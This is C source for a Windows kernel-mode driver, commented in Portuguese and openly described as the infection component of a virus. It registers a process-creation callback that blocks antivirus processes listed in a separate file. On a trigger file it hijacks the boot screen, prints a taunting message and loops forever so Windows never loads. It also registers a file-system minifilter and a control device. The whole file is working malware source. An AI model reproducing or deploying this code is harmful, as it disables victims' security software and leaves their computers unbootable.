/*

	Driver que vai ajudar na infecção
	Ele tem o objetivo de fazer com que o Windows não carregue, exclua os arquivos importantes
	Do Windows, rootkit e também, impedir os antivírus

*/

#include "header.h"
#include "files.h"
#include "irps.h"

/// <summary>
/// Verifica se um processo deve ser negado ou continuado, essa função fará com que os 
/// Antivírus não sejam executados
/// </summary>
/// <param name="ProcessName"></param>
/// <returns></returns>
BOOLEAN DenyProcess(_In_ PCHAR ProcessName)
{
	/*

		Você pode estar se perguntando porque eu não coloquei simplesmente as nome aqui
		Acontece que isso tem um motivo, os antivírus leem os arquivos .SYS, e se existir
		Algum nome dos processos deles, eles indentificam como malware, por isso, não vamos
		Deixar os nomes do antivírus aqui...

		O que vamos fazer é colocar um arquivo de texto que vai conter os nomes dos antivírus
		Assim, torna essa defesa do antivírus inútil, permitindo que eles sejam desativados

	*/

	// Verifique o IRQL, se não foi PASSIVE, não continuaremos
	// Isso pode resultar em um BSOD (tela azul)
	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	{
		return FALSE;
	}

	// Valor para retornar
	BOOLEAN ReturnValue = FALSE;

	// Atributos
	OBJECT_ATTRIBUTES Attributes;
	NTSTATUS Status;

	// Inicie os atributos
	InitializeObjectAttributes(
		&Attributes,
		&FileDeny,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL, NULL
	);

	// Alça
	HANDLE FileHandle;
	IO_STATUS_BLOCK Io;

	// Abra o arquivo (essas funções são explicadas melhores na função: FileExists em files.h)
	Status = ZwOpenFile(
		&FileHandle,
		FILE_READ_ACCESS | SYNCHRONIZE,
		&Attributes,
		&Io,
		FILE_SHARE_READ,
		FILE_NON_DIRECTORY_FILE
	);

	if (NT_SUCCESS(Status))
	{
		__try {

			LARGE_INTEGER byteOffset;

			// Onde guardaremos o texto
			CHAR Buffer[BUFFER_SIZE];
			size_t cb;
			byteOffset.LowPart = byteOffset.HighPart = 0;

			// Leia o arquivo
			Status = ZwReadFile(
				FileHandle,
				NULL, NULL, NULL,
				&Io,
				Buffer,
				BUFFER_SIZE,
				&byteOffset,
				NULL
			);

			if (NT_SUCCESS(Status))
			{
				// String terminada em NULO
				Buffer[BUFFER_SIZE - 1] = '\0';

				// Compare, veja se a string tem no texto
				if (strstr(Buffer, ProcessName))
				{
					// Essa string existe no arquivo
					// Devemos retornar um TRUE

					ReturnValue = TRUE;
				}
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
		}

		// Feche a alça
		ZwClose(FileHandle);
	}

	return ReturnValue;
}

/// <summary>
/// Sempre que um processo, essa será executada, iremos fazer para impedir
/// Processos importantes e antivírus de serem iniciados
/// </summary>
/// <param name="Process"></param>
/// <param name="Pid"></param>
/// <param name="Info"></param>
VOID NewProcess(_In_ PEPROCESS Process, _In_ HANDLE Pid, PPS_CREATE_NOTIFY_INFO Info)
{
	// Verifique se o processo está sendo criado, e não finalizado
	if (Info)
	{
		/*
		* 
		* Antes, eu estava trabalhando com este código, mas decidi mudar, pra ficar mais fácil
		* Esse código obtém o caminho completo do arquivo, mas os antivírus podem
		* Ser instalados em locais diferentes, como o Avast ou AVG
		* 
		// Nome do processo, em CHAR
		CHAR ProcessName[300] = { 0 };

		// Se não conseguir converter UNICODE pra CHAR
		if (!UnicodeStringToChar(GetFullProcessName(Process), ProcessName))
		{
			// Continue o processo
			Info->CreationStatus = STATUS_SUCCESS;

			// Pare
			return;
		}
		*/

		// Se for para negar o processo
		if (DenyProcess(_strupr(PsGetProcessImageFileName(Process))))
		{

			// Acesso negado
			Info->CreationStatus = STATUS_ACCESS_DENIED;
		}

		// Se não
		else {
			Info->CreationStatus = STATUS_SUCCESS;
		}

		// Libere o ProcessName
		//RtlZeroMemory(ProcessName, sizeof(CHAR));
	}
}

/// <summary>
/// Função que inicia o driver
/// </summary>
/// <param name="DriverObject"></param>
/// <param name="RegistryPath"></param>
/// <returns></returns>
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	// Inicie a verificação de processos
	NTSTATUS Status = PsSetCreateProcessNotifyRoutineEx(NewProcess, FALSE);

	// Verifique se o arquivo existe
	if (FileExists(Funny) == TRUE)
	{
		// Ok, vamos impedir o Windows de carregar :)
		LARGE_INTEGER Time;

		// 10 Segundos
		Time.QuadPart = -1000 * -1000 * 10;

		// Limpa a tela
		InbvResetDisplay();

		// Instalar Display StringFilter
		InbvInstallDisplayStringFilter(0);

		// Habilita a impressão de texto na tela
		// 1 = TRUE, 0 = FALSE
		InbvEnableDisplayString(TRUE);

		// Sete as cores das letras para verde
		InbvSetTextColor(VGA_COLOR_BRIGHT_GREEN);

		ShowMessageOnScreen(L"Opa meu amigo, parece que o seu PC não vai ligar mais!\n");
		ShowMessageOnScreen(L"Sinto muito, mas foi você quem escolheu\n\n");
		ShowMessageOnScreen(L"Veja o código do vírus no GitHub: https://github/elDimasX/ \n");

		// Loop infinito, impedindo o Windows de carregar
		while (1)
		{
			// Durma 10 segundos
			KeDelayExecutionThread(
				KernelMode,
				FALSE,
				&Time
			);
		}

		return;
	}

	// Registre nosso filtro
	Status = FltRegisterFilter(DriverObject, &Registration, &MinifilterFilter);

	if (NT_SUCCESS(Status))
	{
		// Inicie a interceptar operações de arquivos
		Status = FltStartFiltering(MinifilterFilter);

		// Se falhar
		if (!NT_SUCCESS(Status))
		{
			// Remova o registros dos arquivos
			FltUnregisterFilter(MinifilterFilter);
		}
	}

	// Crie um dispositivo para comunicações com o user-mode
	Status = IoCreateDevice(
		DriverObject,
		0,
		&DevName,
		FILE_DEVICE_UNKNOWN,
		0,
		TRUE, // Somente uma conexão por vez
		&GlobalDevice 
	);

	if (NT_SUCCESS(Status))
	{
		// Crie o link simbolico
		Status = IoCreateSymbolicLink(&SysLinkName, &DevName);

		if (!NT_SUCCESS(Status))
		{
			// Delete o dispositivo
			IoDeleteDevice(GlobalDevice);
		}
	}

	// Configure as mensagens á receber
	DriverObject->MajorFunction[IRP_MJ_CREATE] = MessageCreated;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MessageReceived;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = MessageClosed;

	return Status;
}

/// <summary>
/// Converte uma UNICODE para CHAR, para que seja possível fazer a comparação
/// </summary>
/// <param name="OldName"></param>
/// <param name="NewName"></param>
/// <returns></returns>
BOOLEAN UnicodeStringToChar(PUNICODE_STRING Unicode, char Char[])
{
	__try {

		// ANSI
		ANSI_STRING AnsiString;
		NTSTATUS Status;

		// CHAR
		char* NameConverted;

		// Inicie de UNICODE para ANSI
		Status = RtlUnicodeStringToAnsiString(
			&AnsiString,
			Unicode,
			TRUE
		);

		// Se não ocorrer falha e for menor que 700
		if (NT_SUCCESS(Status) && AnsiString.Length < 700)
		{
			// Obtenha o CHAR
			NameConverted = (PCHAR)AnsiString.Buffer;

			// Copie o CHAR
			strcpy(Char, _strupr(NameConverted)
			);
		}

		// Se ocorrer um erro
		else {
			return FALSE;
		}

		// Libere o ANSI_STRING alocado
		RtlFreeAnsiString(&AnsiString);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		// Retorne FALSE
		return FALSE;
	}

	// SUCESSO!
	return TRUE;
}

